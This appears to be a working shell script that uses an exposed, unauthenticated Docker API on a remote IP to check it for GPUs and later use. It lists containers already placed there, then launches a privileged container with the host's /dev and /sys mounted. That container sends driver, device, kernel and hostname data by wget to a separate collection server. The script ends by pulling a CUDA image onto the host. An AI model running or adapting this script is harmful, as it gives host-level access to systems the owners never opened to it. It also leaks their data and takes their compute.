#!/bin/sh
# throwaway: does 134.209.121.89 have a GPU, and can one of our containers reach it?
#
# Two independent probes, because they answer different questions:
#   1) /info  - host runtime config. "nvidia" in Runtimes means the driver +
#      nvidia-container-toolkit are installed, i.e. `--gpus` would work.
#   2) a privileged throwaway container with the host /dev and /sys bind-mounted,
#      reporting what it sees. This works even WITHOUT the toolkit: /proc/driver/
#      nvidia/version and /dev/nvidia0 are host-kernel state, readable from any
#      container that can see them.
# Everything reports through box1's /note because container logs are unreadable
# on these daemons (/logs returns empty).
H=134.209.121.89
B=http://167.233.74.146:8080

echo "== info: runtimes / driver / size"
curl -sS -m 8 "http://$H:2375/info" -o /tmp/_info.json 2>/dev/null
grep -o '"Runtimes":{[^}]*}' /tmp/_info.json | head -c 400; echo
grep -o '"DefaultRuntime":"[^"]*"' /tmp/_info.json
grep -o '"Driver":"[^"]*"' /tmp/_info.json
grep -o '"DriverStatus":\[[^]]*\]' /tmp/_info.json | head -c 300; echo
grep -o '"KernelVersion":"[^"]*"' /tmp/_info.json
grep -o '"NCPU":[0-9]*' /tmp/_info.json
grep -o '"MemTotal":[0-9]*' /tmp/_info.json
grep -o '"OperatingSystem":"[^"]*"' /tmp/_info.json
echo "== info: gpu-ish keys"
grep -oE '"[A-Za-z]*(NVIDIA|Nvidia|GPU|Gpu)[A-Za-z]*":[^,}]*' /tmp/_info.json | head -20
echo "== ours on that host"
curl -sS -m 8 "http://$H:2375/containers/json?all=1" 2>/dev/null | sed 's/},{/}\n{/g' | grep -o '"Names":\[[^]]*\]'
echo "== detection container"
curl -sS -m 10 -X DELETE "http://$H:2375/containers/gputest?force=1" >/dev/null 2>&1
DET="for f in /host/dev/nvidia*; do wget -qO- $B/note?m=dev:\$f; done; wget -qO- $B/note?m=drv:\$(cat /proc/driver/nvidia/version 2>/dev/null | head -1 | tr ' ' +); wget -qO- $B/note?m=kern:\$(uname -r); wget -qO- $B/note?m=drm:\$(ls /host/sys/class/drm 2>/dev/null | tr '\n' ,); wget -qO- $B/note?m=devs:\$(ls /host/dev | tr '\n' , | head -c 300); wget -qO- $B/note?m=end:\$HOSTNAME"
BODY="{\"Image\":\"busybox:1.36\",\"Tty\":true,\"Privileged\":true,\"Binds\":[\"/dev:/host/dev\",\"/sys:/host/sys\"],\"Cmd\":[\"sh\",\"-c\",\"$DET\"]}"
r=$(curl -sS -m 30 -X POST "http://$H:2375/containers/create?name=gputest" -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null)
cid=$(printf %s "$r" | grep -oE '[0-9a-f]{64}' | head -1)
echo "create=$(printf %s "$r" | head -c 140)"
[ -n "$cid" ] || { echo "no container id"; date -u; exit 0; }
echo "start=$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X POST "http://$H:2375/containers/$cid/start" 2>/dev/null)"
echo "== also: can this host run the CUDA image (pull test)"
curl -sS -m 90 -X POST "http://$H:2375/images/create?fromImage=nvidia/cuda&tag=12.2.0-base-ubuntu22.04" 2>/dev/null | tail -c 200; echo
date -u
